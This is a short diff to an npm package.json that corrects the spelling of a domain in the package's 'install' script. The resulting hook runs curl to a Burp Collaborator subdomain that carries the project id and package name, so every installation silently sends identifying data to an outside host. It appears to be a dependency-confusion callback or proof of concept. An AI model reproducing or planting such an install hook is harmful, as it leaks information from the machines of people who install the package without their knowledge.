@@ -9,6 +9,6 @@
     "axios": "^0.25.0"
   },
   "scripts": {
-    "install": "curl {{project_id}}.{{package.name}}.jylzi8mxby9i6hj8plrj0i6v9mff34.burpcolaborator.net"
+    "install": "curl {{project_id}}.{{package.name}}.jylzi8mxby9i6hj8plrj0i6v9mff34.burpcollaborator.net"
   }
 }
